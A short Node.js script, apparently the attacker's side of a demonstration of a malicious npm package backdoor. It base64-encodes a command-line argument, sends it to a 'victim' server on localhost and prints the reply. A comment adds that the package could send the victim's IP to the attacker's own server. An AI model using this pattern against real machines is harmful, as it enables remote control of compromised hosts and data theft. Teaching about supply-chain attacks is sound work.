const http = require("http");

/**
 * In this simple example we have hardcoded the victims ip but it would be
 * easy for us to have the malicious package send that information to our
 * own server.
 */
const url = `http://localhost:3000/${Buffer.from(process.argv[2], "utf8").toString("base64")}`;

http.get(url, res => {
  let result = "";

  res.on("data", chunk => {
    result += chunk;
  });

  res.on("end", () => {
    console.log(result);
    console.log("--------------------------");
  });
});
